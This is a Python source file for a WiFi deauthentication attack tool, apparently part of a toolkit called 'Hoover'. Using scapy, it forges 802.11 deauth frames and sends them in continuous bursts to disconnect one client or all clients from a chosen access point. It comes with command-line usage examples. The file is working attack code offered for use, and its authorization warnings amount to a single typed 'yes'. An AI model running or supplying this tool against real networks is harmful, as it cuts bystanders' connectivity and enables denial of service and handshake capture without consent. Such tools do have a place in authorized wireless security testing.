#!/usr/bin/env python3
"""
Deauthentication Attack Tool for Hoover
Sends deauth frames to disconnect clients from WiFi networks
Used for testing network security and authorized penetration testing
"""

import sys
import os
import argparse
import time
from scapy.all import *

class DeauthAttack:
    def __init__(self, interface, target_bssid=None, target_client=None, channel=None, count=0):
        self.interface = interface
        self.target_bssid = target_bssid  # AP MAC address
        self.target_client = target_client  # Client MAC address (None = broadcast)
        self.channel = channel
        self.count = count  # 0 = continuous
        self.packets_sent = 0

    def create_deauth_packet(self, bssid, client):
        """Create a deauthentication packet"""
        # Deauth frame: type=0 (management), subtype=12 (deauth)
        dot11 = Dot11(addr1=client, addr2=bssid, addr3=bssid)
        deauth = Dot11Deauth(reason=7)  # Reason: Class 3 frame received from nonassociated STA
        frame = RadioTap()/dot11/deauth
        return frame

    def set_channel(self):
        """Set the wireless interface to the specified channel"""
        if self.channel:
            try:
                os.system(f"iwconfig {self.interface} channel {self.channel} 2>/dev/null")
                print(f"[+] Set {self.interface} to channel {self.channel}")
            except Exception as e:
                print(f"[!] Warning: Could not set channel: {e}")

    def start_attack(self):
        """Start the deauthentication attack"""
        print(f"[*] Starting deauthentication attack on {self.interface}")
        print(f"[*] Target AP (BSSID): {self.target_bssid if self.target_bssid else 'Broadcast'}")
        print(f"[*] Target Client: {self.target_client if self.target_client else 'Broadcast (all clients)'}")

        if self.channel:
            print(f"[*] Channel: {self.channel}")

        if self.count == 0:
            print("[*] Mode: Continuous (Ctrl+C to stop)")
        else:
            print(f"[*] Sending {self.count} deauth packets")

        print("")

        # Set channel if specified
        self.set_channel()

        try:
            # Determine client address (broadcast if not specified)
            client_addr = self.target_client if self.target_client else "ff:ff:ff:ff:ff:ff"

            # If no BSSID specified, we can't proceed
            if not self.target_bssid:
                print("[!] Error: Target BSSID (AP MAC address) is required")
                sys.exit(1)

            iteration = 0
            while True:
                iteration += 1

                # Create and send deauth packets (send multiple for reliability)
                for _ in range(64):  # Send burst of 64 packets
                    # Deauth from AP to client
                    frame1 = self.create_deauth_packet(self.target_bssid, client_addr)
                    sendp(frame1, iface=self.interface, verbose=False)

                    # Deauth from client to AP (for better effect)
                    frame2 = self.create_deauth_packet(client_addr, self.target_bssid)
                    sendp(frame2, iface=self.interface, verbose=False)

                    self.packets_sent += 2

                print(f"[{iteration}] Sent {self.packets_sent} deauth packets to {client_addr}")

                # Check if we've reached the count limit
                if self.count > 0 and iteration >= self.count:
                    print(f"\n[+] Attack completed. Sent {self.packets_sent} total packets")
                    break

                time.sleep(0.1)  # Brief pause between bursts

        except KeyboardInterrupt:
            print(f"\n\n[*] Attack stopped by user")
            print(f"[*] Total packets sent: {self.packets_sent}")
        except Exception as e:
            print(f"\n[!] Error during attack: {e}")
            sys.exit(1)

def check_monitor_mode(interface):
    """Check if interface is in monitor mode"""
    try:
        result = os.popen(f'iwconfig {interface} 2>/dev/null').read()
        if 'Mode:Monitor' in result:
            return True
        return False
    except:
        return False

def main():
    parser = argparse.ArgumentParser(
        description="Deauthentication Attack Tool - Disconnect clients from WiFi networks",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Deauth all clients from an AP (continuous)
  sudo python3 deauth.py -i wlan0mon -b 00:11:22:33:44:55

  # Deauth specific client from an AP
  sudo python3 deauth.py -i wlan0mon -b 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF

  # Send specific number of deauth bursts
  sudo python3 deauth.py -i wlan0mon -b 00:11:22:33:44:55 -n 10

  # Target specific channel
  sudo python3 deauth.py -i wlan0mon -b 00:11:22:33:44:55 -ch 6

IMPORTANT: For authorized testing only!
- Only use on networks you own or have written authorization to test
- Unauthorized deauthentication attacks may be illegal in your jurisdiction
- This tool is for security research and authorized penetration testing only

Note: Interface must be in monitor mode
      """
    )

    parser.add_argument('-i', '--interface', required=True,
                       help='Wireless interface in monitor mode')
    parser.add_argument('-b', '--bssid', required=True,
                       help='Target AP BSSID (MAC address)')
    parser.add_argument('-c', '--client',
                       help='Target client MAC address (default: broadcast to all)')
    parser.add_argument('-ch', '--channel', type=int,
                       help='WiFi channel (optional)')
    parser.add_argument('-n', '--count', type=int, default=0,
                       help='Number of deauth bursts to send (0 = continuous, default: 0)')

    args = parser.parse_args()

    # Check if running as root
    if os.geteuid() != 0:
        print("[!] This tool requires root privileges (use sudo)")
        sys.exit(1)

    # Check if interface is in monitor mode
    if not check_monitor_mode(args.interface):
        print(f"[!] Warning: {args.interface} may not be in monitor mode")
        print("[!] Enable monitor mode with: sudo airmon-ng start <interface>")
        response = input("Continue anyway? (y/N): ")
        if response.lower() != 'y':
            sys.exit(1)

    # Authorization warning
    print("="*70)
    print("DEAUTHENTICATION ATTACK TOOL")
    print("="*70)
    print("\n⚠️  AUTHORIZATION REQUIRED ⚠️")
    print("\nThis tool sends deauthentication frames to disconnect WiFi clients.")
    print("Only use on networks you own or have written authorization to test.")
    print("\nUnauthorized use may be illegal in your jurisdiction.")
    print("="*70)

    response = input("\nDo you have authorization to test this network? (yes/no): ")
    if response.lower() != 'yes':
        print("[!] Authorization not confirmed. Exiting.")
        sys.exit(1)

    print("\n[+] Authorization confirmed. Starting attack...\n")

    # Create and start attack
    attack = DeauthAttack(
        interface=args.interface,
        target_bssid=args.bssid,
        target_client=args.client,
        channel=args.channel,
        count=args.count
    )

    attack.start_attack()

if __name__ == "__main__":
    main()
